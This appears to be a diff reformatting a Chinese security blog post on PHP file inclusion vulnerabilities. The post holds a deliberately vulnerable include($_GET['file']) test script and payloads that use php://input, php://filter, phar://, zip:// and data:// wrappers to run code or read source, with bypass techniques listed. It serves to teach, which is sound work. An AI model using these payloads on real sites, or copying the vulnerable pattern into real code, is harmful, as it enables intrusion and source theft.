@@ -1,34 +1,295 @@
-<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>文件包含漏洞 - Ghostasky's Blog</title><meta name=author content>
-<meta name=author-link content><meta name=description content><meta name=keywords content='WEB'><meta itemprop=name content="文件包含漏洞"><meta itemprop=description content><meta itemprop=datePublished content="2020-11-25T14:58:30+00:00"><meta itemprop=dateModified content="2020-11-25T14:58:30+00:00"><meta itemprop=wordCount content="1670"><meta itemprop=keywords content="WEB,"><meta property="og:title" content="文件包含漏洞"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-25T14:58:30+00:00"><meta property="article:modified_time" content="2020-11-25T14:58:30+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="文件包含漏洞"><meta name=twitter:description content><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/><link rel=prev href=http://ghostasky.github.io/posts/python__requestsocket%E6%A8%A1%E5%9D%97/><link rel=next href=http://ghostasky.github.io/posts/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"文件包含漏洞","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/ghostasky.github.io\/posts\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/"},"genre":"posts","keywords":"WEB","wordcount":1670,"url":"http:\/\/ghostasky.github.io\/posts\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/","datePublished":"2020-11-25T14:58:30+00:00","dateModified":"2020-11-25T14:58:30+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt="Ghostasky's Blog" data-title="Ghostasky's Blog" class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt=/images/fixit.png data-title=/images/fixit.png class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><main class=container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>文件包含漏洞</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><i class="fa-solid fa-user-circle" aria-hidden=true></i>
-Anonymous</span></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/technology/ class=post-category title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> Technology</a></span></div><div class=post-meta-line><span title="发布于 2020-11-25 14:58:30"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2020-11-25>2020-11-25</time></span>&nbsp;<span title="1670 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 1700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 4 分钟</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
-<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1文件包含相关函数>1.文件包含相关函数</a></li><li><a href=#2文件包含漏洞的利用方式--伪协议>2.文件包含漏洞的利用方式&ndash;伪协议</a><ul><li><a href=#之后的测试代码>之后的测试代码</a></li><li><a href=#phpinput>php://input</a></li><li><a href=#phpfilter>php://filter</a></li><li><a href=#phar>phar://</a></li><li><a href=#zip>zip://</a></li><li><a href=#data>data://</a></li></ul></li><li><a href=#3绕过>3.绕过</a><ul><li><a href=#指定前缀>指定前缀</a></li><li><a href=#指定后缀>指定后缀</a></li><li><a href=#长度截断>长度截断</a></li><li><a href=#00截断>00截断</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>[TOC]</p><h2 id=1文件包含相关函数 class=heading-element><a href=#1%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0 class=heading-mark></a>1.文件包含相关函数</h2><p>​ include()，include_once()，require()，require_once()</p><ul><li>require()函数如果在包含的时候有错，如文件不存在，会直接退出，不执行后面的语句</li><li>include()函数如果在包含的时候有错，如文件不存在，不会直接退出，会执行后面的语句</li><li>*_once()与*()的作用类似，如果一个文件已经被包含，则*_once()不会再包含它，避免函数重新定义或者变量重新赋值等</li></ul><p>​ 用这几个函数包含文件时，无论什么类型的文件，都会当做php文件进行解析。</p><p>​ 分类：</p><ul><li><p>LFI（Local File Inclusion）</p></li><li><p>RFI（Remote File Inclusion）</p><p>利用条件较为苛刻，allow_url_fopen = on，all_url_include = on</p><p>两个配置选项均需on，才能远程包含文件成功。</p></li></ul><h2 id=2文件包含漏洞的利用方式--伪协议 class=heading-element><a href=#2%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f--%e4%bc%aa%e5%8d%8f%e8%ae%ae class=heading-mark></a>2.文件包含漏洞的利用方式&ndash;伪协议</h2><table><thead><tr><th>协议</th><th>测试版本</th><th>allow_url_fopen</th><th>all_url_include</th><th>用法</th></tr></thead><tbody><tr><td>file://</td><td>>=5.2</td><td>off/on</td><td>off/on</td><td>?file=file://D:/phpstudy/WWW/phpcode.txt</td></tr><tr><td>php://filter</td><td>>=5.2</td><td>off/on</td><td>off/on</td><td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td>php://input</td><td>>=5.2</td><td>off/on</td><td>on</td><td>?file=php://input [POST DATA]</td></tr><tr><td>zip://</td><td>>=5.2</td><td>off/on</td><td>off/on</td><td>?file=zip://D:/phpstydy/WWW/file.zip#phpcode.txt</td></tr><tr><td>data://</td><td>>=5.2</td><td>on</td><td>on</td><td>?file=data://text/plain, [OR]?file=data://text/plain;base64,[base64编码] [oR]?file=data:text/plain, [OR]?file=data:text/plain;base64,[base64编码]</td></tr></tbody></table><p>php://filter 是一种元封装器，设计用于数据楼打开是的筛选过滤应用</p><p>data:// 同样类似于php://input，可以让用户控制输入流</p><p>php://input可以访问请求的原始数据的制度刘，将post请求的数据当做PHP代码执行</p><p>phar://xxxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</p><h3 id=之后的测试代码 class=heading-element><a href=#%e4%b9%8b%e5%90%8e%e7%9a%84%e6%b5%8b%e8%af%95%e4%bb%a3%e7%a0%81 class=heading-mark></a>之后的测试代码</h3><div class=highlight id=id-1><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>    <span class=k>include</span> <span class=nv>$file</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	<span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>//www目录
-</span></span></span><span class=line><span class=cl><span class=err>    //有a.txt，&lt;?php phpinfo();?&gt;
-</span></span></span><span class=line><span class=cl><span class=err>    //有a.zip,里面含a.txt
-</span></span></span></code></pre></div><h3 id=phpinput class=heading-element><a href=#phpinput class=heading-mark></a>php://input</h3><p>​ 利用条件：</p><blockquote><p>​ allow_url_include=on，allow_url_fopen不做要求</p></blockquote><div class=highlight id=id-2><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>姿势：</span>
-</span></span><span class=line><span class=cl><span class=o>/?</span><span class=nx>file</span><span class=o>=</span><span class=nx>php</span><span class=o>://</span><span class=nx>input</span>
-</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>post</span><span class=p>]</span>
-</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>phpinfo</span><span class=p>();</span><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><h3 id=phpfilter class=heading-element><a href=#phpfilter class=heading-mark></a>php://filter</h3><blockquote><p>​ 利用条件：上面的那两个配置文件选项都不做要求</p></blockquote><div class=highlight id=id-3><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>姿势</span>
-</span></span><span class=line><span class=cl><span class=o>/?</span><span class=nx>file</span><span class=o>=</span><span class=nx>php</span><span class=o>://</span><span class=nx>filter</span><span class=o>/</span><span class=nx>read</span><span class=o>=</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>encode</span><span class=o>/</span><span class=nx>resource</span><span class=o>=</span><span class=nx>a</span><span class=o>.</span><span class=nx>txt</span>
-</span></span><span class=line><span class=cl><span class=o>/?</span><span class=nx>file</span><span class=o>=</span><span class=nx>php</span><span class=o>://</span><span class=nx>filter</span><span class=o>/</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>encode</span><span class=o>/</span><span class=nx>resource</span><span class=o>=</span><span class=nx>a</span><span class=o>.</span><span class=nx>txt</span></span></span></code></pre></div><p>​ 通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能获取shell，但危害也挺大。</p><h3 id=phar class=heading-element><a href=#phar class=heading-mark></a>phar://</h3><blockquote><p>​ 利用条件：PHP版本>=5.3.0</p></blockquote><div class=highlight id=id-4><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>假设有个a</span><span class=o>.</span><span class=nx>zip压缩包，里面有个a</span><span class=o>.</span><span class=nx>txt里面有</span><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>phpinfo</span><span class=p>();</span><span class=cp>?&gt;</span><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>/?file=phar://a.zip/a.txt
-</span></span></span><span class=line><span class=cl><span class=err>绝对相对路径都OK
-</span></span></span></code></pre></div><h3 id=zip class=heading-element><a href=#zip class=heading-mark></a>zip://</h3><blockquote><p>利用条件：</p><p>​ PHP版本>=5.3.0</p><p>​ 需要绝对路径，同时编码#为%23</p></blockquote><div class=highlight id=id-5><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>/?</span><span class=nx>file</span><span class=o>=</span><span class=nx>zip</span><span class=o>://</span><span class=nx>D</span><span class=o>:</span><span class=nx>\wamp64\www\a</span><span class=o>.</span><span class=nx>zip</span><span class=o>%</span><span class=mi>23</span><span class=nx>a</span><span class=o>.</span><span class=nx>txt</span>
-</span></span><span class=line><span class=cl><span class=c1>//如果使用相对路径，包含会失败。
-</span></span></span></code></pre></div><h3 id=data class=heading-element><a href=#data class=heading-mark></a>data://</h3><blockquote><p>利用条件：</p><p>​ 1.PHP版本大于5.2</p><p>​ 2.allow_url_fopen=on</p><p>​ 3.allow_url_include=on</p></blockquote><pre tabindex=0><code>姿势一：
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>文件包含漏洞 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='WEB' /><meta itemprop="name" content="文件包含漏洞">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2020-11-25T14:58:30+00:00" />
+<meta itemprop="dateModified" content="2020-11-25T14:58:30+00:00" />
+<meta itemprop="wordCount" content="1670">
+<meta itemprop="keywords" content="WEB," /><meta property="og:title" content="文件包含漏洞" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-11-25T14:58:30+00:00" />
+<meta property="article:modified_time" content="2020-11-25T14:58:30+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="文件包含漏洞"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://ghostasky.github.io/posts/python__requestsocket%E6%A8%A1%E5%9D%97/" /><link rel="next" href="http://ghostasky.github.io/posts/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "文件包含漏洞",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/ghostasky.github.io\/posts\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/"
+    },"genre": "posts","keywords": "WEB","wordcount":  1670 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/","datePublished": "2020-11-25T14:58:30+00:00","dateModified": "2020-11-25T14:58:30+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "作者"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                >关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>文件包含漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2020-11-25 14:58:30"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2020-11-25">2020-11-25</time></span>&nbsp;<span title="1670 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1文件包含相关函数">1.文件包含相关函数</a></li>
+    <li><a href="#2文件包含漏洞的利用方式--伪协议">2.文件包含漏洞的利用方式&ndash;伪协议</a>
+      <ul>
+        <li><a href="#之后的测试代码">之后的测试代码</a></li>
+        <li><a href="#phpinput">php://input</a></li>
+        <li><a href="#phpfilter">php://filter</a></li>
+        <li><a href="#phar">phar://</a></li>
+        <li><a href="#zip">zip://</a></li>
+        <li><a href="#data">data://</a></li>
+      </ul>
+    </li>
+    <li><a href="#3绕过">3.绕过</a>
+      <ul>
+        <li><a href="#指定前缀">指定前缀</a></li>
+        <li><a href="#指定后缀">指定后缀</a></li>
+        <li><a href="#长度截断">长度截断</a></li>
+        <li><a href="#00截断">00截断</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>[TOC]</p>
+<h2 id="1文件包含相关函数" class="heading-element">
+  <a href="#1%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0" class="heading-mark"></a>1.文件包含相关函数</h2><p>​	include()，include_once()，require()，require_once()</p>
+<ul>
+<li>require()函数如果在包含的时候有错，如文件不存在，会直接退出，不执行后面的语句</li>
+<li>include()函数如果在包含的时候有错，如文件不存在，不会直接退出，会执行后面的语句</li>
+<li>*_once()与*()的作用类似，如果一个文件已经被包含，则*_once()不会再包含它，避免函数重新定义或者变量重新赋值等</li>
+</ul>
+<p>​	用这几个函数包含文件时，无论什么类型的文件，都会当做php文件进行解析。</p>
+<p>​	分类：</p>
+<ul>
+<li>
+<p>LFI（Local File Inclusion）</p>
+</li>
+<li>
+<p>RFI（Remote File Inclusion）</p>
+<p>利用条件较为苛刻，allow_url_fopen = on，all_url_include = on</p>
+<p>两个配置选项均需on，才能远程包含文件成功。</p>
+</li>
+</ul>
+<h2 id="2文件包含漏洞的利用方式--伪协议" class="heading-element">
+  <a href="#2%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f--%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark"></a>2.文件包含漏洞的利用方式&ndash;伪协议</h2><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>测试版本</th>
+<th>allow_url_fopen</th>
+<th>all_url_include</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?file=file://D:/phpstudy/WWW/phpcode.txt</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>on</td>
+<td>?file=php://input             [POST DATA] <!-- raw HTML omitted --></td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?file=zip://D:/phpstydy/WWW/file.zip#phpcode.txt</td>
+</tr>
+<tr>
+<td>data://</td>
+<td>&gt;=5.2</td>
+<td>on</td>
+<td>on</td>
+<td>?file=data://text/plain,<!-- raw HTML omitted -->                        [OR]?file=data://text/plain;base64,[base64编码]                   [oR]?file=data:text/plain,<!-- raw HTML omitted -->                           [OR]?file=data:text/plain;base64,[base64编码]</td>
+</tr>
+</tbody>
+</table>
+<p>php://filter  是一种元封装器，设计用于数据楼打开是的筛选过滤应用</p>
+<p>data://   同样类似于php://input，可以让用户控制输入流</p>
+<p>php://input可以访问请求的原始数据的制度刘，将post请求的数据当做PHP代码执行</p>
+<p>phar://xxxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</p>
+<h3 id="之后的测试代码" class="heading-element">
+  <a href="#%e4%b9%8b%e5%90%8e%e7%9a%84%e6%b5%8b%e8%af%95%e4%bb%a3%e7%a0%81" class="heading-mark"></a>之后的测试代码</h3><div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">//www目录
+</span></span></span><span class="line"><span class="cl"><span class="err">    //有a.txt，&lt;?php phpinfo();?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    //有a.zip,里面含a.txt
+</span></span></span></code></pre></div><h3 id="phpinput" class="heading-element">
+  <a href="#phpinput" class="heading-mark"></a>php://input</h3><p>​	利用条件：</p>
+<blockquote>
+<p>​		allow_url_include=on，allow_url_fopen不做要求</p>
+</blockquote>
+<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">姿势：</span>
+</span></span><span class="line"><span class="cl"><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">input</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">post</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h3 id="phpfilter" class="heading-element">
+  <a href="#phpfilter" class="heading-mark"></a>php://filter</h3><blockquote>
+<p>​	利用条件：上面的那两个配置文件选项都不做要求</p>
+</blockquote>
+<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">姿势</span>
+</span></span><span class="line"><span class="cl"><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">a</span><span class="o">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">a</span><span class="o">.</span><span class="nx">txt</span></span></span></code></pre></div><p>​	通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能获取shell，但危害也挺大。</p>
+<h3 id="phar" class="heading-element">
+  <a href="#phar" class="heading-mark"></a>phar://</h3><blockquote>
+<p>​	利用条件：PHP版本&gt;=5.3.0</p>
+</blockquote>
